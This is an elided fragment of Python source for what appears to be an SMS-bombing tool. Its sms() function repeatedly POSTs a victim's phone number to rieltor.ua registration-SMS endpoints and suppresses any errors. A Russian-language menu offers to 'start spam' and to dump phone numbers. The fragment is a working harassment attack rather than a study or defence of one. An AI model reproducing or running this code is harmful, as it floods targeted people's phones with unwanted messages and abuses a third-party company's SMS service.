			...
			def sms():
				...
				try:
					try:
						...
						requests.post("https://rieltor.ua/api/users/register-sms//", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""})
					except:
						pass
					try:
					...
					try:
						...
						requests.post("https://rieltor.ua/api/users/register-sms/",data={"phone": phonee})
					except:
						pass
					try:
			...
			def main():
				...
				while True:
					...
					if input1 == "1":
						...
						print(info)
						print("Выбери цыфру:")
						print("1. Запустить спам")
						print("2. Выгрузить номера ")
						print("3. Выгрузить номера(Недоделаное) ")
